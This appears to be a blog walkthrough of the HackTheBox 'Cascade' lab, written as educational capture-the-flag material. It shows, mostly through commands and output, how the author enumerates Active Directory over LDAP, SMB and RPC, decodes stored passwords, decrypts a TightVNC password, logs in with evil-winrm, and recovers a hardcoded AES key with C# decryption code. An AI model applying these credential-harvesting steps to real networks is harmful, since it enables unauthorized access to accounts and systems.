---
layout: post
title: Hackthebox Cascade Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/cascade.png)

# Explanation
[Hackthebox](https://www.hackthebox.eu/) is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Cascade`.

# Solution
## 1. Initial Enumeration
#### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.182 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:29 JST
Nmap scan report for 10.10.10.182
Host is up (0.23s latency).
Not shown: 65520 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-26 11:40:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m18s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-07-26T11:41:50
|_  start_date: 2020-07-26T10:12:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 634.60 seconds
```

#### SMB enumeration:
```shell
root@kali:~# smbclient -L 10.10.10.182
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

#### LDAP enumeration (For namingcontexts):
```shell
root@kali:~# ldapsearch -h 10.10.10.182 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

### LDAP Enumeration:
```shell
root@kali:~# ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=cascade,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# cascade.local
dn: DC=cascade,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS

---

```

#### RPC enumeration:
```shell
root@kali:~# rpcclient -U '' -N 10.10.10.182
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
rpcclient $> 
```

## 2. Getting User

In the LDAP scanning result, we can find an interesting attribute `cascadeLegacyPwd: clk0bjVldmE=` for user `r.thompson`.
```shell
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

We can encode the password with the following command.
```shell
root@kali:~# echo clk0bjVldmE= | base64 -d
rY4n5eva
```

Using [evil-winrm](https://github.com/Hackplayers/evil-winrm), try to login as `r.thompson` with the password `rY4n5eva`.<br>
However, we can't achieve a shell since user `r.thompson` is not allowed to use it.
```shell
root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.182 -u r.thompson -p rY4n5eva

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

Then, try to enumerate SMB.<br>
We have some interesting shares.
```shell
root@kali:~# smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
[+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	Audit$                                            	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	Data                                              	READ ONLY	
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	print$                                            	READ ONLY	Printer Drivers
	SYSVOL                                            	READ ONLY	Logon server share 
```

In `\Data`, we have some interesting files.
```shell
root@kali:~# smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva -R data
[+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	data                                              	READ ONLY	
	.\data\*
	dr--r--r--                0 Wed Jan 29 07:05:51 2020	.
	dr--r--r--                0 Wed Jan 29 07:05:51 2020	..
	dr--r--r--                0 Mon Jan 13 10:45:14 2020	Contractors
	dr--r--r--                0 Mon Jan 13 10:45:10 2020	Finance
	dr--r--r--                0 Wed Jan 29 03:04:51 2020	IT
	dr--r--r--                0 Mon Jan 13 10:45:20 2020	Production
	dr--r--r--                0 Mon Jan 13 10:45:16 2020	Temps
	.\data\IT\*
	dr--r--r--                0 Wed Jan 29 03:04:51 2020	.
	dr--r--r--                0 Wed Jan 29 03:04:51 2020	..
	dr--r--r--                0 Wed Jan 29 03:00:30 2020	Email Archives
	dr--r--r--                0 Wed Jan 29 03:04:51 2020	LogonAudit
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	Logs
	dr--r--r--                0 Wed Jan 29 07:06:59 2020	Temp
	.\data\IT\Email Archives\*
	dr--r--r--                0 Wed Jan 29 03:00:30 2020	.
	dr--r--r--                0 Wed Jan 29 03:00:30 2020	..
	fr--r--r--             2522 Wed Jan 29 03:00:30 2020	Meeting_Notes_June_2018.html
	.\data\IT\Logs\*
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	.
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	..
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	Ark AD Recycle Bin
	dr--r--r--                0 Wed Jan 29 09:56:00 2020	DCs
	.\data\IT\Logs\Ark AD Recycle Bin\*
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	.
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	..
	fr--r--r--             1303 Wed Jan 29 10:19:11 2020	ArkAdRecycleBin.log
	.\data\IT\Logs\DCs\*
	dr--r--r--                0 Wed Jan 29 09:56:00 2020	.
	dr--r--r--                0 Wed Jan 29 09:56:00 2020	..
	fr--r--r--             5967 Mon Jan 27 07:22:05 2020	dcdiag.log
	.\data\IT\Temp\*
	dr--r--r--                0 Wed Jan 29 07:06:59 2020	.
	dr--r--r--                0 Wed Jan 29 07:06:59 2020	..
	dr--r--r--                0 Wed Jan 29 07:06:55 2020	r.thompson
	dr--r--r--                0 Wed Jan 29 05:00:05 2020	s.smith
	.\data\IT\Temp\s.smith\*
	dr--r--r--                0 Wed Jan 29 05:00:05 2020	.
	dr--r--r--                0 Wed Jan 29 05:00:05 2020	..
	fr--r--r--             2680 Wed Jan 29 05:00:01 2020	VNC Install.reg
```

Try to download all files in `Data` using `smbclient`.
```shell
root@kali:~# smbclient -U r.thompson //10.10.10.182/data rY4n5eva
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (1.4 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (3.4 KiloBytes/sec) (average 1.8 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (1.2 KiloBytes/sec) (average 1.6 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
smb: \>
```

In `IT\Temp\s.smith`, we can find a configuration file for `VNC`.
```shell
root@kali:~/IT/Temp/s.smith# cat 'VNC Install.reg'
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

In this configuration, there is a following line includes an encrypted password.
```shell
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```


```shell
msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> pass="\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), pass
=> "sT333ve2"
```

Then, try to log in as `s.smith` using the password `sT333ve2`.<br>
We can achieve an user shell.
```shell
root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.182 -u s.smith -p sT333ve2

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> 
```

`user.txt` is in the directory `C:\Users\s.smith\Documents`.
```shell
*Evil-WinRM* PS C:\Users\s.smith\Documents> cat C:\Users\s.smith\Desktop\user.txt
dfa503e9bc06ef4d8ef096943283c014
```


## 3. Getting Root
Take a look at the current user.<br>
`s.smith` is in `Audit Share`, `IT` and `Remote Management Use` groups.
```shell
*Evil-WinRM* PS C:\Users\s.smith\Documents> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   7/28/2020 3:21:54 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

For the PowerShell, we can use the following command to show the user information.
```shell
*Evil-WinRM* PS C:\Users\s.smith\Documents> Get-ADUser -identity s.smith -properties *


AccountExpirationDate              :
accountExpires                     : 9223372036854775807
AccountLockoutTime                 :
AccountNotDelegated                : False
AllowReversiblePasswordEncryption  : False
BadLogonCount                      : 0
badPasswordTime                    : 132403764963483208
badPwdCount                        : 0
CannotChangePassword               : True
CanonicalName                      : cascade.local/UK/Users/Steve Smith
Certificates                       : {}
City                               :
CN                                 : Steve Smith
codePage                           : 0
Company                            :
Country                            :
countryCode                        : 0
Created                            : 1/9/2020 6:08:13 PM
createTimeStamp                    : 1/9/2020 6:08:13 PM
Deleted                            :
Department                         :
Description                        :
DisplayName                        : Steve Smith
DistinguishedName                  : CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
Division                           :
DoesNotRequirePreAuth              : False
dSCorePropagationData              : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/13/2020 4:36:28 PM, 1/9/2020 6:08:13 PM...}
EmailAddress                       :
EmployeeID                         :
EmployeeNumber                     :
Enabled                            : True
Fax                                :
GivenName                          : Steve
HomeDirectory                      :
HomedirRequired                    : False
HomeDrive                          :
HomePage                           :
HomePhone                          :
Initials                           :
instanceType                       : 4
isDeleted                          :
LastBadPasswordAttempt             : 7/28/2020 3:21:36 AM
LastKnownParent                    :
lastLogoff                         : 0
lastLogon                          : 132403765148187532
LastLogonDate                      : 7/28/2020 3:21:54 AM
lastLogonTimestamp                 : 132403765148187532
LockedOut                          : False
logonCount                         : 16
LogonWorkstations                  :
Manager                            :
MemberOf                           : {CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local, CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local, CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local}
MNSLogonAccount                    : False
MobilePhone                        :
Modified                           : 7/28/2020 3:21:54 AM
modifyTimeStamp                    : 7/28/2020 3:21:54 AM
msDS-User-Account-Control-Computed : 0
Name                               : Steve Smith
nTSecurityDescriptor               : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                     : CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
ObjectClass                        : user
ObjectGUID                         : 38ebd9df-c4f7-4d00-9a9f-f503432ffa7d
objectSid                          : S-1-5-21-3332504370-1206983947-1165150453-1107
Office                             :
OfficePhone                        :
Organization                       :
OtherName                          :
PasswordExpired                    : False
PasswordLastSet                    : 1/28/2020 7:58:05 PM
PasswordNeverExpires               : True
PasswordNotRequired                : False
POBox                              :
PostalCode                         :
PrimaryGroup                       : CN=Domain Users,CN=Users,DC=cascade,DC=local
primaryGroupID                     : 513
ProfilePath                        :
ProtectedFromAccidentalDeletion    : False
pwdLastSet                         : 132247150854857364
SamAccountName                     : s.smith
sAMAccountType                     : 805306368
ScriptPath                         : MapAuditDrive.vbs
sDRightsEffective                  : 0
ServicePrincipalNames              : {}
SID                                : S-1-5-21-3332504370-1206983947-1165150453-1107
SIDHistory                         : {}
SmartcardLogonRequired             : False
sn                                 : Smith
State                              :
StreetAddress                      :
Surname                            : Smith
Title                              :
TrustedForDelegation               : False
TrustedToAuthForDelegation         : False
UseDESKeyOnly                      : False
userAccountControl                 : 66048
userCertificate                    : {}
UserPrincipalName                  : s.smith@cascade.local
uSNChanged                         : 323714
uSNCreated                         : 16404
whenChanged                        : 7/28/2020 3:21:54 AM
whenCreated                        : 1/9/2020 6:08:13 PM
```

Since we got a new user, try to enumerate the SMB shares again.<br>
We can find that now we can read access to `Audit$` previously we didn't have any access.
```shell
root@kali:~# smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
[+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	Audit$                                            	READ ONLY	
	C$                                                	NO ACCESS	Default share
	Data                                              	READ ONLY	
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	print$                                            	READ ONLY	Printer Drivers
	SYSVOL                                            	READ ONLY	Logon server share
```

Alternatively, we can we `smbclient` as well(But it doesn't show the access permission).
```shell
root@kali:~# smbclient -L 10.10.10.182 -U s.smith
Enter WORKGROUP\s.smith's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Audit$          Disk      
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	print$          Disk      Printer Drivers
	SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```


```shell
root@kali:~# smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 -R Audit$
[+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Audit$                                            	READ ONLY	
	.\Audit$\*
	dr--r--r--                0 Thu Jan 30 03:01:26 2020	.
	dr--r--r--                0 Thu Jan 30 03:01:26 2020	..
	fr--r--r--            13312 Wed Jan 29 06:47:08 2020	CascAudit.exe
	fr--r--r--            12288 Thu Jan 30 03:01:26 2020	CascCrypto.dll
	dr--r--r--                0 Wed Jan 29 06:43:18 2020	DB
	fr--r--r--               45 Wed Jan 29 08:29:47 2020	RunAudit.bat
	fr--r--r--           363520 Wed Jan 29 05:42:18 2020	System.Data.SQLite.dll
	fr--r--r--           186880 Wed Jan 29 05:42:18 2020	System.Data.SQLite.EF6.dll
	dr--r--r--                0 Wed Jan 29 05:42:18 2020	x64
	dr--r--r--                0 Wed Jan 29 05:42:18 2020	x86
	.\Audit$\DB\*
	dr--r--r--                0 Wed Jan 29 06:43:18 2020	.
	dr--r--r--                0 Wed Jan 29 06:43:18 2020	..
	fr--r--r--            24576 Wed Jan 29 06:43:18 2020	Audit.db
	.\Audit$\x64\*
	dr--r--r--                0 Wed Jan 29 05:42:18 2020	.
	dr--r--r--                0 Wed Jan 29 05:42:18 2020	..
	fr--r--r--          1639936 Wed Jan 29 05:42:18 2020	SQLite.Interop.dll
	.\Audit$\x86\*
	dr--r--r--                0 Wed Jan 29 05:42:18 2020	.
	dr--r--r--                0 Wed Jan 29 05:42:18 2020	..
	fr--r--r--          1246720 Wed Jan 29 05:42:18 2020	SQLite.Interop.dll
```

To download files with specific extensions, we can use `smbmap` with `-A` option.
```shell
root@kali:~# smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 -R Audit$ -A .db
[+] IP: 10.10.10.182:445	Name: 10.10.10.182
[+] Starting search for files matching '.db' on share Audit$.
[+] Match found! Downloading: Audit$\DB\Audit.db
root@kali:~# smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 -R Audit$ -A .exe
[+] IP: 10.10.10.182:445	Name: 10.10.10.182
[+] Starting search for files matching '.exe' on share Audit$.
[+] Match found! Downloading: Audit$\CascAudit.exe
root@kali:~# smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 -R Audit$ -A .bat
[+] IP: 10.10.10.182:445	Name: 10.10.10.182
[+] Starting search for files matching '.bat' on share Audit$.
[+] Match found! Downloading: Audit$\RunAudit.bat
root@kali:~# smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 -R Audit$ -A .dll
[+] IP: 10.10.10.182:445	Name: 10.10.10.182
[+] Starting search for files matching '.dll' on share Audit$.
[+] Match found! Downloading: Audit$\CascCrypto.dll
[+] Match found! Downloading: Audit$\System.Data.SQLite.dll
[+] Match found! Downloading: Audit$\System.Data.SQLite.EF6.dll
[+] Match found! Downloading: Audit$\x64\SQLite.Interop.dll
[+] Match found! Downloading: Audit$\x86\SQLite.Interop.dll
```

Using `file` command, we can figure out that `Audit.db` is SQLite 3.x database file.
```shell
root@kali:~# file 10.10.10.182-Audit_DB_Audit.db 
10.10.10.182-Audit_DB_Audit.db: SQLite 3.x database, last written using SQLite version 3027002
```

To take a look at the `Audit.db`, run `sqlite3` command.<br>
There is a "password" for user `ArkSvc`.
```shell
root@kali:~# sqlite3 10.10.10.182-Audit_DB_Audit.db 
SQLite version 3.32.3 2020-06-18 14:00:33
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> select * from LDAP;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
sqlite> .schema LDAP
CREATE TABLE IF NOT EXISTS "Ldap" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"uname"	TEXT,
	"pwd"	TEXT,
	"domain"	TEXT
);
```

However, this password is encrypted.
```shell
root@kali:~# echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
������D�|zC�;
```

Next, take a look at `RunAudit.bat`.<br>
IT runs `CascAudit.exe` with the argument `\\CASC-DC1\Audit$\DB\Audit.db`.
```shell
root@kali:~# cat 10.10.10.182-Audit_RunAudit.bat 
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

Since we do not have the source code for `CascAudit.exe`, decompile it with [dnSpy](https://github.com/0xd4d/dnSpy).<br>
First, spin up Windows VM, launch `dnSpy` and open the `CascAudit.exe`.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-31/cascade.png)


![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-31/cascade.png)
```shell
namespace CascAudiot
{
	// Token: 0x02000008 RID: 8
	[StandardModule]
	internal sealed class MainModule
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002128 File Offset: 0x00000328
		[STAThread]
		public static void Main()
		{
			if (MyProject.Application.CommandLineArgs.Count != 1)
			{
				Console.WriteLine("Invalid number of command line args specified. Must specify database path only");
				return;
			}
			checked
			{
				using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
				{
					string str = string.Empty;
					string password = string.Empty;
					string str2 = string.Empty;
					try
					{
						sqliteConnection.Open();
						using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
						{
							using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
							{
								sqliteDataReader.Read();
								str = Conversions.ToString(sqliteDataReader["Uname"]);
								str2 = Conversions.ToString(sqliteDataReader["Domain"]);
								string text = Conversions.ToString(sqliteDataReader["Pwd"]);
								try
								{
									password = Crypto.DecryptString(text, "c4scadek3y654321");
								}
								catch (Exception ex)
								{
									Console.WriteLine("Error decrypting password: " + ex.Message);
									return;
								}
							}
						}
						sqliteConnection.Close();
					}
					catch (Exception ex2)
					{
						Console.WriteLine("Error getting LDAP connection data From database: " + ex2.Message);
						return;
					}
					int num = 0;
					using (DirectoryEntry directoryEntry = new DirectoryEntry())
					{
						directoryEntry.Username = str2 + "\\" + str;
						directoryEntry.Password = password;
						directoryEntry.AuthenticationType = AuthenticationTypes.Secure;
						using (DirectorySearcher directorySearcher = new DirectorySearcher(directoryEntry))
						{
							directorySearcher.Tombstone = true;
							directorySearcher.PageSize = 1000;
							directorySearcher.Filter = "(&(isDeleted=TRUE)(objectclass=user))";
							directorySearcher.PropertiesToLoad.AddRange(new string[]
							{
								"cn",
								"sAMAccountName",
								"distinguishedName"
							});
							using (SearchResultCollection searchResultCollection = directorySearcher.FindAll())
							{
								Console.WriteLine("Found " + Conversions.ToString(searchResultCollection.Count) + " results from LDAP query");
								sqliteConnection.Open();
								try
								{
									try
									{
										foreach (object obj in searchResultCollection)
										{
											SearchResult searchResult = (SearchResult)obj;
											string text2 = string.Empty;
											string text3 = string.Empty;
											string text4 = string.Empty;
											if (searchResult.Properties.Contains("cn"))
											{
												text2 = Conversions.ToString(searchResult.Properties["cn"][0]);
											}
											if (searchResult.Properties.Contains("sAMAccountName"))
											{
												text3 = Conversions.ToString(searchResult.Properties["sAMAccountName"][0]);
											}
											if (searchResult.Properties.Contains("distinguishedName"))
											{
												text4 = Conversions.ToString(searchResult.Properties["distinguishedName"][0]);
											}
											using (SQLiteCommand sqliteCommand2 = new SQLiteCommand("INSERT INTO DeletedUserAudit (Name,Username,DistinguishedName) VALUES (@Name,@Username,@Dn)", sqliteConnection))
											{
												sqliteCommand2.Parameters.AddWithValue("@Name", text2);
												sqliteCommand2.Parameters.AddWithValue("@Username", text3);
												sqliteCommand2.Parameters.AddWithValue("@Dn", text4);
												num += sqliteCommand2.ExecuteNonQuery();
											}
										}
									}
									finally
									{
										IEnumerator enumerator;
										if (enumerator is IDisposable)
										{
											(enumerator as IDisposable).Dispose();
										}
									}
								}
								finally
								{
									sqliteConnection.Close();
									Console.WriteLine("Successfully inserted " + Conversions.ToString(num) + " row(s) into database");
								}
							}
						}
					}
				}
			}
		}

		// Token: 0x04000008 RID: 8
		private const int USER_DISABLED = 2;
	}
}
```

Following is the important section.<br>
It is getting the encrypted password from SQLite database and decrypting with the key `c4scadek3y654321`.
```shell
					sqliteConnection.Open();
						using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
						{
							using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
							{
								sqliteDataReader.Read();
								str = Conversions.ToString(sqliteDataReader["Uname"]);
								str2 = Conversions.ToString(sqliteDataReader["Domain"]);
								string text = Conversions.ToString(sqliteDataReader["Pwd"]);
								try
								{
									password = Crypto.DecryptString(text, "c4scadek3y654321");
								}
								catch (Exception ex)
								{
									Console.WriteLine("Error decrypting password: " + ex.Message);
									return;
								}
							}
						}
						sqliteConnection.Close();
```

However, `CascAudit.exe` does not have the definition of `Crypto.DecryptString()`.<br>
Then, take a look at `CascCrypto.dll`. We can find the function defined.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-31/cascade.png)
```shell
public static string DecryptString(string EncryptedString, string Key)
		{
			byte[] array = Convert.FromBase64String(EncryptedString);
			Aes aes = Aes.Create();
			aes.KeySize = 128;
			aes.BlockSize = 128;
			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
			aes.Mode = 1;
			aes.Key = Encoding.UTF8.GetBytes(Key);
			string @string;
			using (MemoryStream memoryStream = new MemoryStream(array))
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), 0))
				{
					byte[] array2 = new byte[checked(array.Length - 1 + 1)];
					cryptoStream.Read(array2, 0, array2.Length);
					@string = Encoding.UTF8.GetString(array2);
				}
			}
			return @string;
		}
```

To get the password to log in, we have to write a .NET code
Actually, if we google, we can find someone's left the code here [https://dotnetfiddle.net/2RDoWz](https://dotnetfiddle.net/2RDoWz).
```shell
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
					
public class Program
{
	public static void Main()
	{
		string str = string.Empty;
		str = DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321");
		Console.WriteLine(str);
	}
	
	public static string DecryptString(string EncryptedString, string Key)
    {
      byte[] buffer = Convert.FromBase64String(EncryptedString);
      Aes aes = Aes.Create();
      ((SymmetricAlgorithm) aes).KeySize = 128;
      ((SymmetricAlgorithm) aes).BlockSize = 128;
      ((SymmetricAlgorithm) aes).IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
      ((SymmetricAlgorithm) aes).Mode = CipherMode.CBC;
      ((SymmetricAlgorithm) aes).Key = Encoding.UTF8.GetBytes(Key);
      using (MemoryStream memoryStream = new MemoryStream(buffer))
      {
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, ((SymmetricAlgorithm) aes).CreateDecryptor(), CryptoStreamMode.Read))
        {
          byte[] numArray = new byte[checked (buffer.Length - 1 + 1)];
          cryptoStream.Read(numArray, 0, numArray.Length);
          return Encoding.UTF8.GetString(numArray);
        }
      }
    }
}
```

